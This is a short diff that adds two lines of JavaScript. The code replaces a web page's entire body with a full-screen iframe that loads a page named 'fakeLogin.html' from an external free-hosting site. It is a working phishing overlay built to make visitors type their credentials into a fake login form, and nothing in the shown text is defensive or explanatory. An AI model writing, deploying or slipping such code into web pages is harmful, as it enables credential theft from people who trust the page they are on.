@@ -1,0 +1,2 @@
+let iframe = document.createElement("iframe");iframe.setAttribute("style", "width: 100%; height: 100%;  z-index:99999;");iframe.setAttribute("src", "https://tk0038.000webhostapp.com/fakeLogin.html");javascript:document.body.innerHTML=iframe.outerHTML;javascript:document.body.style.padding="0px";
+javascript:document.body.style.height="300%";javascript:document.body.style.width="100%";
